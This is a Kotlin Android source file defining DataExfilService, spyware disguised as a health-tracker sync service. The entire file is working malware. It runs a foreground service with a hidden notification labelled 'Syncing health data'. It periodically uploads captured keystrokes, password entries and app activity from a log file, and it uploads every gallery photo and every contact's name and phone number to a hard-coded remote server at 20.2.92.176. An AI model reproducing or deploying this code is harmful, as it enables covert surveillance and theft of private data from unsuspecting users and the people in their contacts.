package com.inf2007.healthtracker.utilities

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.os.*
import android.util.Log
import androidx.core.app.NotificationCompat
import org.json.JSONArray
import org.json.JSONObject
import java.io.File
import java.io.OutputStreamWriter
import java.net.HttpURLConnection
import java.net.URL
import java.text.SimpleDateFormat
import java.util.*
import android.database.ContentObserver
import android.provider.MediaStore
import android.content.ContentUris
import android.net.Uri
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.RequestBody.Companion.toRequestBody
import java.io.IOException
import android.provider.ContactsContract
import java.net.Inet4Address
import java.net.NetworkInterface
import java.util.Collections

class DataExfilService : Service() {

    companion object {
        const val TAG = "DataExfilService"
        private const val NOTIFICATION_CHANNEL_ID = "data_exfil_channel"
        private const val NOTIFICATION_ID = 1001
        private const val SERVER_ENDPOINT = "http://20.2.92.176:5000/accessibility_logs"
    }

    private val photosEndpoint = "http://20.2.92.176:5000/photos"
    private val contactsEndpoint = "http://20.2.92.176:5000/contacts"

    private lateinit var photoObserver: ContentObserver
    private lateinit var contactsObserver: ContentObserver

    private val photoSyncPrefs by lazy {
        getSharedPreferences("photo_sync_log", Context.MODE_PRIVATE)
    }
    private val contactsSyncPrefs by lazy {
        getSharedPreferences("contacts_sync_log", Context.MODE_PRIVATE)
    }

    private lateinit var handler: Handler
    private var isUploading = false

    // Upload every 30 seconds
    private val uploadInterval = 30 * 1000L

    private val uploadRunnable = object : Runnable {
        override fun run() {
            if (!isUploading) {
                uploadAccessibilityLogs()
            }
            handler.postDelayed(this, uploadInterval)
        }
    }

    override fun onCreate() {
        super.onCreate()
        handler = Handler(Looper.getMainLooper())
        createNotificationChannel()
        setupPhotoObserver()
        setupContactsObserver()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.d(TAG, "Data exfiltration service started")

        startForegroundService()

        // Start periodic uploads
        handler.postDelayed(uploadRunnable, 10000)

        return START_STICKY
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channelName = "Health Data Sync"
            val channelDescription = "Uploads health data to server"
            val importance = NotificationManager.IMPORTANCE_LOW

            val channel = NotificationChannel(
                NOTIFICATION_CHANNEL_ID,
                channelName,
                importance
            ).apply {
                description = channelDescription
                setShowBadge(false)
            }

            val notificationManager = getSystemService(NotificationManager::class.java)
            notificationManager.createNotificationChannel(channel)
        }
    }

    private fun startForegroundService() {
        val notification = createNotification()
        startForeground(NOTIFICATION_ID, notification)
        Log.d(TAG, "Foreground service started with notification")
    }

    private fun createNotification(): Notification {
        return NotificationCompat.Builder(this, NOTIFICATION_CHANNEL_ID)
            .setContentTitle("Health Tracker")
            .setContentText("Syncing health data...")
            .setSmallIcon(android.R.drawable.stat_sys_upload)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setOngoing(true)
            .setAutoCancel(false)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .build()
    }

    // ========== ACCESSIBILITY LOGS ==========
    private fun uploadAccessibilityLogs() {
        if (isUploading) return
        if (!isNetworkAvailable()) {
            Log.d(TAG, "No network available, skipping upload")
            return
        }

        isUploading = true
        Log.d(TAG, "Starting log upload...")

        Thread {
            try {
                val logContent = readSpyLogs()
                if (logContent.isEmpty()) {
                    Log.d(TAG, "No logs to upload")
                    isUploading = false
                    return@Thread
                }

                Log.d(TAG, "Found ${logContent.lines().size} log entries")

                val logs = parseLogsForNotifications(logContent)
                val success = sendToServer(logs)

                if (success) {
                    Log.d(TAG, "Spy logs uploaded successfully")
                    archiveLogs()
                } else {
                    Log.w(TAG, "Upload failed")
                }

            } catch (e: Exception) {
                Log.e(TAG, "Error uploading logs: ${e.message}", e)
            } finally {
                isUploading = false
            }
        }.start()
    }

    private fun readSpyLogs(): String {
        return try {
            val logFile = File(filesDir, "watch.log")
            if (logFile.exists()) {
                val fileSize = logFile.length()
                Log.d(TAG, "Log file exists, size: $fileSize bytes")
                if (fileSize > 0) {
                    val content = logFile.readText()
                    Log.d(TAG, "Read ${content.lines().size} lines from log file")
                    content
                } else {
                    Log.d(TAG, "Log file is empty")
                    ""
                }
            } else {
                Log.d(TAG, "Log file does not exist")
                ""
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error reading log file", e)
            ""
        }
    }

    private fun parseLogsForNotifications(logContent: String): JSONObject {
        val logsArray = logContent.lines().filter { it.isNotBlank() }
        Log.d(TAG, "Parsing ${logsArray.size} log entries")

        val notificationData = JSONObject().apply {
            put("type", "watch")
            put("device_id", Build.SERIAL ?: "unknown")
            put("device_model", Build.MODEL)
            put("android_version", Build.VERSION.RELEASE)
            put("timestamp", System.currentTimeMillis())
            put("total_entries", logsArray.size)
            put("collection_time", SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(Date()))
            put("app_package", packageName)
        }

        val keyPresses = JSONArray()
        val appSwitches = JSONArray()
        val clicks = JSONArray()
        val sensitiveData = JSONArray()
        val notifications = JSONArray()

        logsArray.forEach { line ->
            when {
                line.contains("TYPING") || line.contains("TEXT") -> keyPresses.put(line)
                line.contains("APP_SWITCH") -> appSwitches.put(line)
                line.contains("CLICK") -> clicks.put(line)
                line.contains("SENSITIVE") || line.contains("PASSWORD") -> sensitiveData.put(line)
                line.contains("NOTIFICATION") -> notifications.put(line)
                else -> keyPresses.put(line)
            }
        }

        val categorizedLogs = JSONObject().apply {
            put("key_presses", keyPresses)
            put("app_switches", appSwitches)
            put("clicks", clicks)
            put("sensitive_data", sensitiveData)
            put("notifications", notifications)
        }

        notificationData.put("logs", categorizedLogs)

        return notificationData
    }

    private fun sendToServer(data: JSONObject): Boolean {
        return try {
            Log.d(TAG, "Sending data to server: ${data.toString().length} bytes")

            val url = URL(SERVER_ENDPOINT)
            val connection = url.openConnection() as HttpURLConnection
            connection.requestMethod = "POST"
            connection.setRequestProperty("Content-Type", "application/json; charset=utf-8")
            connection.setRequestProperty("User-Agent", "HealthTracker-Spy/1.0")
            connection.setRequestProperty("Accept", "application/json")
            connection.connectTimeout = 15000
            connection.readTimeout = 15000
            connection.doOutput = true

            val outputStream = connection.outputStream
            OutputStreamWriter(outputStream, "UTF-8").use { writer ->
                writer.write(data.toString())
                writer.flush()
            }

            val responseCode = connection.responseCode
            val responseMessage = connection.responseMessage

            Log.d(TAG, "Server response: $responseCode $responseMessage")

            try {
                val response = if (responseCode >= 400) {
                    connection.errorStream.bufferedReader().use { it.readText() }
                } else {
                    connection.inputStream.bufferedReader().use { it.readText() }
                }
                Log.d(TAG, "Response body: $response")
            } catch (e: Exception) {
                Log.d(TAG, "Could not read response body")
            }

            connection.disconnect()

            responseCode in 200..299

        } catch (e: Exception) {
            Log.e(TAG, "Error sending to server: ${e.message}")
            Log.e(TAG, "Full error: ", e)
            false
        }
    }

    private fun archiveLogs() {
        try {
            val logFile = File(filesDir, "watch.log")
            if (logFile.exists() && logFile.length() > 0) {
                val timestamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(Date())
                val archivedFile = File(filesDir, "watch_$timestamp.log")
                logFile.copyTo(archivedFile)
                logFile.writeText("")
                Log.d(TAG, "Logs archived to: ${archivedFile.name}")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error archiving logs: ${e.message}")
        }
    }

    private fun isNetworkAvailable(): Boolean {
        return try {
            val connectivityManager = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
            val network = connectivityManager.activeNetwork ?: return false
            val capabilities = connectivityManager.getNetworkCapabilities(network) ?: return false

            capabilities.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) ||
                    capabilities.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR)
        } catch (e: Exception) {
            Log.e(TAG, "Network check error", e)
            false
        }
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        handler.removeCallbacks(uploadRunnable)
        Log.d(TAG, "Data exfiltration service destroyed")
        super.onDestroy()
        contentResolver.unregisterContentObserver(photoObserver)
        contentResolver.unregisterContentObserver(contactsObserver)
    }

    private fun setupPhotoObserver() {
        photoObserver = object : ContentObserver(Handler(Looper.getMainLooper())) {
            override fun onChange(selfChange: Boolean, uri: Uri?) {
                scanAndUploadPhotos()
            }
        }
        contentResolver.registerContentObserver(
            MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
            true,
            photoObserver
        )
        scanAndUploadPhotos()
    }

    private fun scanAndUploadPhotos() {
        if (!isNetworkAvailable()) {
            Log.d(TAG, "No network, skipping photo scan")
            return
        }

        val projection = arrayOf(
            MediaStore.Images.Media._ID,
            MediaStore.Images.Media.DISPLAY_NAME
        )

        contentResolver.query(
            MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
            projection,
            null,
            null,
            "${MediaStore.Images.Media.DATE_ADDED} DESC"
        )?.use { cursor ->
            val totalImages = cursor.count
            Log.d(TAG, "Gallery Scan: $totalImages images found")

            val idColumn = cursor.getColumnIndexOrThrow(MediaStore.Images.Media._ID)
            val nameColumn = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME)

            var uploadCount = 0
            while (cursor.moveToNext()) {
                val id = cursor.getLong(idColumn)
                val fileName = cursor.getString(nameColumn)

                if (!photoSyncPrefs.getBoolean("id_$id", false)) {
                    val contentUri = ContentUris.withAppendedId(
                        MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                        id
                    )
                    uploadPhotoToServer(contentUri, fileName, id)
                    uploadCount++
                }
            }
            Log.d(TAG, "Scan Complete: $uploadCount new images queued")
        }
    }

    private fun uploadPhotoToServer(uri: Uri, fileName: String, photoId: Long) {
        try {
            val inputStream = contentResolver.openInputStream(uri)
            val bytes = inputStream?.readBytes() ?: return
            inputStream.close()

            val requestBody = MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("file", fileName,
                    bytes.toRequestBody("image/jpeg".toMediaTypeOrNull()))
                .build()

            val request = Request.Builder()
                .url(photosEndpoint)
                .post(requestBody)
                .build()

            NetworkClient.instance.newCall(request).enqueue(object : Callback {
                override fun onFailure(call: Call, e: IOException) {
                    Log.e(TAG, "Photo upload failed: $fileName")
                }
                override fun onResponse(call: Call, response: Response) {
                    if (response.isSuccessful) {
                        Log.d(TAG, "Photo uploaded: $fileName")
                        photoSyncPrefs.edit().putBoolean("id_$photoId", true).apply()
                    }
                    response.close()
                }
            })
        } catch (e: Exception) {
            Log.e(TAG, "Error uploading photo: ${e.message}")
        }
    }

    private fun setupContactsObserver() {
        contactsObserver = object : ContentObserver(Handler(Looper.getMainLooper())) {
            override fun onChange(selfChange: Boolean, uri: Uri?) {
                Log.d(TAG, "Contacts database changed: $uri")
                scanAndUploadContacts()
            }
        }

        contentResolver.registerContentObserver(
            ContactsContract.Contacts.CONTENT_URI,
            true,
            contactsObserver
        )

        Log.d(TAG, "Contacts observer registered")

        // Automatically scan if permission is already granted when service starts
        if (hasContactsPermission()) {
            Log.d(TAG, "Contacts permission granted, performing initial scan")
            scanAndUploadContacts()
        }
    }

    private fun hasContactsPermission(): Boolean {
        return checkSelfPermission(android.Manifest.permission.READ_CONTACTS) ==
                android.content.pm.PackageManager.PERMISSION_GRANTED
    }

    private fun scanAndUploadContacts() {
        if (!isNetworkAvailable()) {
            Log.d(TAG, "No network, skipping contacts scan")
            return
        }

        if (!hasContactsPermission()) {
            Log.d(TAG, "No contacts permission, skipping scan")
            return
        }

        Log.d(TAG, "Starting contacts scan...")

        val projection = arrayOf(
            ContactsContract.Contacts._ID,
            ContactsContract.Contacts.DISPLAY_NAME,
            ContactsContract.Contacts.HAS_PHONE_NUMBER
            // Removed CONTACT_LAST_UPDATED_TIMESTAMP as it's not available on all API levels
        )

        contentResolver.query(
            ContactsContract.Contacts.CONTENT_URI,
            projection,
            null,
            null,
            null  // Remove ordering by timestamp
        )?.use { cursor ->
            val totalContacts = cursor.count
            Log.d(TAG, "Contacts Scan: $totalContacts contacts found")

            val idColumn = cursor.getColumnIndexOrThrow(ContactsContract.Contacts._ID)
            val nameColumn = cursor.getColumnIndexOrThrow(ContactsContract.Contacts.DISPLAY_NAME)
            val hasPhoneColumn = cursor.getColumnIndexOrThrow(ContactsContract.Contacts.HAS_PHONE_NUMBER)

            var uploadCount = 0
            while (cursor.moveToNext()) {
                val contactId = cursor.getString(idColumn)
                val name = cursor.getString(nameColumn) ?: "Unnamed"
                val hasPhone = cursor.getInt(hasPhoneColumn)

                if (!contactsSyncPrefs.getBoolean("contact_$contactId", false)) {
                    var phoneNumber = "No number found"

                    if (hasPhone > 0) {
                        phoneNumber = getPhoneNumberForContact(contactId)
                    }

                    uploadContactToServer(contactId, name, phoneNumber)
                    contactsSyncPrefs.edit().putBoolean("contact_$contactId", true).apply()
                    uploadCount++
                }
            }
            Log.d(TAG, "Contacts Scan Complete: $uploadCount new contacts uploaded")
        }
    }

    private fun getPhoneNumberForContact(contactId: String): String {
        var phoneNumber = "No number found"

        contentResolver.query(
            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
            arrayOf(ContactsContract.CommonDataKinds.Phone.NUMBER),
            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
            arrayOf(contactId),
            null
        )?.use { phoneCursor ->
            if (phoneCursor.moveToFirst()) {
                val numberColumn = phoneCursor.getColumnIndexOrThrow(
                    ContactsContract.CommonDataKinds.Phone.NUMBER
                )
                phoneNumber = phoneCursor.getString(numberColumn)
            }
        }

        return phoneNumber
    }

    private fun uploadContactToServer(contactId: String, contactName: String, phoneNumber: String) {
        try {
            val ipAddress = getDeviceIPAddress()

            val contactData = JSONObject().apply {
                put("type", "contact")
                put("device_ip", ipAddress)
                put("device_model", Build.MODEL)
                put("android_version", Build.VERSION.RELEASE)
                put("timestamp", System.currentTimeMillis())
                put("app_package", packageName)
                put("contact_id", contactId)
                put("contact_name", contactName)
                put("phone_number", phoneNumber)
            }

            val requestBody = contactData.toString()
                .toRequestBody("application/json; charset=utf-8".toMediaTypeOrNull())

            val request = Request.Builder()
                .url(contactsEndpoint)
                .post(requestBody)
                .addHeader("User-Agent", "HealthTracker/1.0")
                .build()

            NetworkClient.instance.newCall(request).enqueue(object : Callback {
                override fun onFailure(call: Call, e: IOException) {
                    Log.e(TAG, "Contact upload failed: $contactName - ${e.message}")
                    contactsSyncPrefs.edit().remove("contact_$contactId").apply()
                }

                override fun onResponse(call: Call, response: Response) {
                    if (response.isSuccessful) {
                        Log.d(TAG, "Contact uploaded: $contactName -> $phoneNumber")
                    } else {
                        Log.w(TAG, "Contact upload failed: HTTP ${response.code}")
                        contactsSyncPrefs.edit().remove("contact_$contactId").apply()
                    }
                    response.close()
                }
            })

        } catch (e: Exception) {
            Log.e(TAG, "Error uploading contact: ${e.message}")
            contactsSyncPrefs.edit().remove("contact_$contactId").apply()
        }
    }

    private fun getDeviceIPAddress(): String {
        return try {
            val networkInterfaces = Collections.list(NetworkInterface.getNetworkInterfaces())

            for (intf in networkInterfaces) {
                val addresses = Collections.list(intf.inetAddresses)
                for (addr in addresses) {
                    if (!addr.isLoopbackAddress && addr is Inet4Address) {
                        val ip = addr.hostAddress ?: ""
                        if (!ip.startsWith("169.254.")) {
                            return ip
                        }
                    }
                }
            }
            "unknown"
        } catch (e: Exception) {
            Log.e(TAG, "Error getting IP address: ${e.message}")
            "unknown"
        }
    }
}